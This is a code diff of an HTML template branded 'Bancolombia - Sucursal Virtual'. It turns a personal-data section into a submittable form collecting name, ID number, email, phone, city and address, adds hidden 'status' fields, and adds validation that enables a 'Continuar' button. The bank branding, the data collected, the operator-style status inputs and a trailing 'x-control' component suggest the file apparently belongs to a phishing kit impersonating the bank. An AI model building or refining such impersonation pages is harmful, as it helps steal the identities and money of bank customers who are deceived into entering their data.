@@ -4,6 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
     <title>Bancolombia - Sucursal Virtual</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -222,7 +223,7 @@
         <div id="datos" class="w-full flex flex-col justify-center items-center pb-6">
             <h5 class="text-[24px] font-cib-sans-bold mt-10">Datos personales</h5>
             <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
-                <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
+                <form id="formulario" class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
                     <div class="w-full flex items-center justify-center hiddenerror hidden">
                         <span class="text-[11px] text-red-600"> Verifica la información e inténtalo nuevamente.</span>
                     </div>
@@ -314,14 +315,17 @@
                         <span id="direccionError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                     </div>
 
+                    <input type="hidden" id="status" name="status" value="datos" />
+                    <input type="hidden" id="no-status" name="no-status" value="datos" />
+
                     <div class="w-full pt-6 pb-2 flex justify-end items-center px-[15px]">
-                        <button id="continuarDatos"
-                            class="font-bold py-2 px-6 bg-bancolombia-yellow rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed w-32"
+                        <button id="enviar"
+                            class="font-bold py-2 px-6 rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                             disabled>
                             Continuar
                         </button>
                     </div>
-                </div>
+                </form>
             </div>
         </div>
 
@@ -335,6 +339,66 @@
     </div>
 
     <script>
+        /* ===== UTILIDADES ===== */
+
+        /**
+         * Habilita o deshabilita un botón con estilos apropiados
+         */
+        function toggleButton(btn, enabled) {
+            if (!btn) return;
+            btn.disabled = !enabled;
+            if (enabled) {
+                btn.classList.remove('bg-gray-300', 'text-black', 'cursor-not-allowed');
+                btn.classList.add('bg-bancolombia-yellow', 'text-black', 'cursor-pointer');
+            } else {
+                btn.classList.remove('bg-bancolombia-yellow', 'cursor-pointer');
+                btn.classList.add('bg-gray-300', 'text-black', 'cursor-not-allowed');
+            }
+        }
+
+        /**
+         * Muestra o oculta mensajes de error
+         */
+        function setError(id, msg) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            if (msg) {
+                el.textContent = msg;
+                el.classList.remove('hidden');
+            } else {
+                el.classList.add('hidden');
+            }
+        }
+
+        /* ===== FLOATING LABELS ===== */
+
+        /**
+         * Configura los floating labels para todos los inputs
+         */
+        function setupFloatingLabels() {
+            const inputs = document.querySelectorAll('.floating-input');
+            inputs.forEach(input => {
+                const label = input.nextElementSibling;
+                if (!label || !label.classList.contains('floating-label')) return;
+
+                // Activar label si hay valor
+                function updateLabel() {
+                    if (input.value) {
+                        label.classList.add('active');
+                    } else {
+                        label.classList.remove('active');
+                    }
+                }
+
+                input.addEventListener('focus', () => label.classList.add('active'));
+                input.addEventListener('blur', updateLabel);
+                input.addEventListener('input', updateLabel);
+
+                // Inicializar estado
+                updateLabel();
+            });
+        }
+
         /* ===== VALIDACIONES DE CAMPOS DE ENTRADA ===== */
 
         /**
@@ -405,22 +469,33 @@
             }
 
             const isValid = Object.keys(errores).length === 0;
+
+            // Habilitar/deshabilitar botón
+            const btnEnviar = document.getElementById('enviar');
+            toggleButton(btnEnviar, isValid);
+
             return isValid;
         }
 
-        /**
-         * Muestra o oculta mensajes de error
-         */
-        function setError(id, msg) {
-            const el = document.getElementById(id);
-            if (!el) return;
-            if (msg) {
-                el.textContent = msg;
-                el.classList.remove('hidden');
-            } else {
-                el.classList.add('hidden');
-            }
-        }
+        /* ===== INICIALIZACIÓN ===== */
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Setup floating labels
+            setupFloatingLabels();
+
+            // Agregar listeners de validación a todos los campos
+            const campos = ['nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion'];
+            campos.forEach(campoId => {
+                const campo = document.getElementById(campoId);
+                if (campo) {
+                    campo.addEventListener('input', () => validateDatos(false));
+                    campo.addEventListener('blur', () => validateDatos(true));
+                }
+            });
+
+            // Validación inicial
+            validateDatos(false);
+        });
     </script>
 
     <x-control
